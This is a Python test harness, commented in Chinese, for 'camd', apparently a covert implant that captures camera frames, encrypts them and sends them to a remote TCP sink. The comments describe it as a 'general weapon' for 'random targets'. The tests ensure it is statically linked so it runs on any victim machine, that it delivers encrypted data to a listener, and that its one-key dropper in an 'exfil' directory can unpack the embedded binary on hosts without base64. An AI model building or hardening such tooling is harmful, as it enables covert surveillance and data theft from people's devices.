#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
可移植性守卫：验证 camd 能在"随机目标机"上执行，而不是只在本机能跑。

背景（本轮实测）：
  动态链接的 camd 要求 GLIBC_2.34：
      objdump -T camd | grep GLIBC → GLIBC_2.2.5 … GLIBC_2.34
  于是 Ubuntu 20.04(2.31) / Debian 10(2.28) / CentOS 7(2.17) 这类存量机器上
  一律 "version `GLIBC_2.34' not found"；musl(Alpine) 连解释器路径都对不上。
  "通用武器、随机目标"的前提就是不能挑 libc —— 所以默认产物必须静态链接。

本守卫判据分两类：
  A. 静态性断言（F1-F3）：无 NEEDED / 无 INTERP / 无 GLIBC 版本要求
  B. 鉴别力对照（F4）  ：动态版确实有 GLIBC_2.34。
     没有 F4，"F3 通过"可能只是因为 objdump 没跑起来。
  C. 实跑（F5-F6）      ：静态版真能建连并送达密文信元
  D. 依赖自持（F7）     ：onekey.sh 在没有 base64 命令时仍能解码内嵌产物

反向验证：
  R1 用动态版冒充静态版 → F1/F2/F3 必须变红。否则这三条是恒绿的。
"""
import os
import re
import socket
import subprocess
import sys
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
AW = os.path.dirname(HERE)
ROOT = os.path.dirname(AW)

CAMD = os.path.join(AW, "build", "linux", "camd")
CAMD_ORIG = CAMD
SNAP = ""
ONEKEY = os.path.join(ROOT, "21_exfil", "onekey.sh")

results = []


def rec(name, ok, detail=""):
    results.append((name, bool(ok), detail))
    print("[%s] %s%s" % ("PASS" if ok else "FAIL", name, (" -- " + detail) if detail else ""))
    return bool(ok)


def sh(cmd, **kw):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300, **kw)


def elf_dynamic_tags(path):
    """
    返回 (needed列表, interp字符串)

    【判据修正】INTERP 不能用 `readelf -d` + 方括号正则来抓：
    实测 readelf -d 的 INTERP 行格式是
        (INTERP)  Requesting program interpreter: /lib64/ld-linux-x86-64.so.2
    **不带方括号**（NEEDED 行才带）。按方括号抓会永远匹配不到，
    于是 F2 对动态版也返回"无 INTERP"——一条恒绿的假判据。
    改用 program header 段名检测。
    """
    p = sh("readelf -d %s 2>/dev/null" % path)
    needed = re.findall(r"NEEDED.*?\[(.+?)\]", p.stdout)
    l = sh("readelf -l %s 2>/dev/null | grep -i 'INTERP'" % path)
    return needed, (l.stdout.strip() if l.stdout.strip() else "")


def glibc_versions(path):
    p = sh("objdump -T %s 2>/dev/null | grep -oE 'GLIBC_[0-9.]+' | sort -uV" % path)
    return [x for x in p.stdout.split() if x]


def build_dynamic_control():
    """
    构建动态链接对照版。只链接、不重编译（.o 已存在），很快。

    【必须先删目标】make 判据是时间戳，.o 没变时它认为 camd 已是最新，
    不会重新链接 —— 于是 cp 走的还是上一轮的静态产物，F4 会拿着静态版
    冒充动态对照，得出"动态版也不挑 libc"的假结论。
    """
    out = "/tmp/camd_dynamic_control"
    # 【不得就地删改被测产物】
    # 本函数会临时把 build/linux/camd 换成动态版。若并发或中断，构建目录里的
    # camd 会凭空消失 —— 实测 make test 重跑时 F0 报"camd 已构建"失败，
    # 排查方向被引向"构建坏了"，真实成因只是守卫自己在删文件。
    # 所以：先备份 → 构建动态对照 → 立刻用备份还原，且全程不动被测快照。
    backup = "/tmp/camd_backup_during_control"
    sh("rm -f %s %s" % (out, backup))
    sh("cp %s %s 2>/dev/null" % (CAMD_ORIG, backup))
    sh("rm -f %s/build/linux/camd" % AW)
    r = sh("make -C %s STATIC=0 build/linux/camd >/dev/null 2>&1 && cp %s/build/linux/camd %s"
           % (AW, AW, out))
    # 还原：优先用备份直接拷回，拷不回才重新构建
    sh("rm -f %s/build/linux/camd && cp %s %s/build/linux/camd 2>/dev/null" % (AW, backup, AW))
    if not os.path.exists(os.path.join(AW, "build", "linux", "camd")):
        sh("make -C %s build/linux/camd >/dev/null 2>&1" % AW)
    if r.returncode != 0:
        return None
    return out if os.path.exists(out) else None


def serve_and_run(cam, port, use_host="127.0.0.1"):
    """起真实 TCP 收端，跑 camd 一次，返回 (rc, 收到字节数, 首段)"""
    got = []
    conns = []

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", port))
    srv.listen(5)

    def acc():
        srv.settimeout(30)
        try:
            while True:
                c, _ = srv.accept()
                conns.append(1)
                buf = b""
                c.settimeout(20)
                while True:
                    d = c.recv(65536)
                    if not d:
                        break
                    buf += d
                got.append(buf)
                c.close()
        except Exception:
            pass

    t = threading.Thread(target=acc, daemon=True)
    t.start()

    key = "a" * 32 + "b" * 32
    cmd = [cam, "--sink", "tcp://%s:%d" % (use_host, port), "--backend", "mock",
           "--key", key, "--batches", "1", "--frames", "1",
           "--interval-ms", "0", "--jitter-ms", "0", "--no-persist"]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
        rc = p.returncode
    except subprocess.TimeoutExpired:
        rc = -1
    time.sleep(0.5)
    try:
        srv.close()
    except Exception:
        pass
    total = sum(len(x) for x in got)
    return rc, total, (got[0] if got else b""), len(conns)


def b64_fallback_ok():
    """
    验证 onekey.sh 在没有 base64 命令时仍能解码内嵌产物。
    做法：造一个只含 openssl 的 PATH 目录，跑 checkpayload。
    """
    if not os.path.exists(ONEKEY):
        return False, "onekey.sh 不存在: %s" % ONEKEY
    # 必须用"生成后的包"测：onekey.sh 是模板，内嵌区为空，
    # 用它测会得到"内嵌产物为空"，无法区分是解码器缺失还是包本身是空的。
    mk = os.path.join(ROOT, "21_exfil", "make_onekey.py")
    pkg = "/tmp/ok_portable_test.sh"
    sh("rm -f %s" % pkg)
    rg = sh("python3 %s amd64=%s -o %s 2>&1" % (mk, CAMD, pkg))
    if rg.returncode != 0 or not os.path.exists(pkg):
        return False, "生成包失败: %s" % (rg.stdout + rg.stderr)[-160:]
    target = pkg
    # 造一个缺 base64 的 PATH（保留其余必需命令）
    d = "/tmp/nobase64_path"
    sh("rm -rf %s && mkdir -p %s" % (d, d))
    for c in ["sh", "bash", "awk", "sed", "grep", "cat", "tr", "cut", "wc",
              "od", "id", "uname", "date", "sleep", "mktemp", "chmod",
              "cp", "mv", "rm", "printf", "ps", "kill", "install", "strip",
              "openssl", "python3", "head", "tail", "find", "dirname", "basename"]:
        p = sh("command -v %s" % c).stdout.strip()
        if p:
            sh("ln -sf %s %s/%s" % (p, d, c))
    # 确认这个 PATH 里确实没有 base64
    chk = sh("env -i PATH=%s sh -c 'command -v base64'" % d)
    if chk.stdout.strip():
        return False, "隔离 PATH 里仍有 base64，场景无效"
    r = sh("env -i PATH=%s HOME=/tmp /bin/sh %s checkpayload 2>&1" % (d, target))
    out = r.stdout + r.stderr
    # 静态包内嵌产物若为空（模板未生成），checkpayload 会报"内嵌产物为空"
    # 那时无法区分解码器缺失与包为空 —— 需要先确认这是一个已生成产物的包
    if "内嵌产物为空" in out or "没有" in out and "分节" in out:
        return None, "本包无内嵌产物（是模板），该场景不适用: %s" % out.strip()[-80:]
    ok = ("不是 ELF" in out) or ("ELF" in out and "校验通过" in out) or r.returncode == 0
    return bool(ok), out.strip()[-160:]


def main():
    print("=== 可移植性守卫（随机目标机） ===\n")

    # 被测产物可指定：反向验证时用动态版冒充，检验 F1/F2/F3 是否真有鉴别力。
    global CAMD
    if len(sys.argv) > 1:
        CAMD = os.path.abspath(sys.argv[1])
        print("[反向模式] 被测产物 = %s\n" % CAMD)

    if not os.path.exists(CAMD):
        rec("F0 camd 已构建", False, CAMD)
        return finish()

    # 所有断言一律用快照，不直接测构建目录里的产物：
    # 构建目录会被 F4 的对照构建动到，直接测会因并发/中断而假失败。
    global CAMD_ORIG, SNAP
    CAMD_ORIG = CAMD
    SNAP = "/tmp/camd_under_test_snapshot"
    sh("rm -f %s" % SNAP)
    sh("cp %s %s 2>/dev/null" % (CAMD, SNAP))
    if os.path.exists(SNAP):
        CAMD = SNAP

    # --- A. 静态性断言 ---
    needed, interp = elf_dynamic_tags(CAMD)
    rec("F1 产物无 NEEDED（不依赖任何 .so）",
        len(needed) == 0, "NEEDED=%s" % (needed or "无"))

    rec("F2 产物无 INTERP（不需要动态链接器）",
        interp == "", "INTERP=%s" % (interp or "无"))

    gv = glibc_versions(CAMD)
    rec("F3 产物无 GLIBC 版本要求",
        len(gv) == 0, "GLIBC=%s" % (" ".join(gv) if gv else "无"))

    # --- B. 鉴别力对照：动态版必须有 GLIBC 要求 ---
    ctrl = build_dynamic_control()
    if not ctrl:
        rec("F4 动态对照版可构建", False, "无法构建 STATIC=0 对照版")
    else:
        c_needed, c_interp = elf_dynamic_tags(ctrl)
        c_gv = glibc_versions(ctrl)
        worst = c_gv[-1] if c_gv else "无"
        ok = len(c_needed) > 0 and len(c_gv) > 0
        rec("F4 对照：动态版确实挑 libc（证明 F1/F3 有鉴别力）",
            ok, "动态版 NEEDED=%s 最高GLIBC=%s —— 这类产物在旧发行版上跑不了"
            % (c_needed, worst))

    # --- C. 实跑 ---
    port = 47101
    rc, total, first, nconn = serve_and_run(CAMD, port)
    rec("F5 静态产物实跑退出码为 0", rc == 0, "rc=%s" % rc)
    rec("F6 静态产物真送达密文信元",
        total > 0 and first.find(b"\xff\xd8\xff") < 0,
        "连接=%d 字节=%d 含JPEG明文=%s 字节种类=%d"
        % (nconn, total, first.find(b"\xff\xd8\xff") >= 0, len(set(first)) if first else 0))

    # --- D. 依赖自持 ---
    r7, d7 = b64_fallback_ok()
    if r7 is None:
        print("[SKIP] F7 无 base64 时仍能解码 -- %s" % d7)
    else:
        rec("F7 目标机无 base64 时仍能解码内嵌产物", r7, d7)

    print()
    return finish()


def finish():
    p = sum(1 for _, o, _ in results if o)
    f = sum(1 for _, o, _ in results if not o)
    print("结果: %d pass / %d fail" % (p, f))
    return 0 if f == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
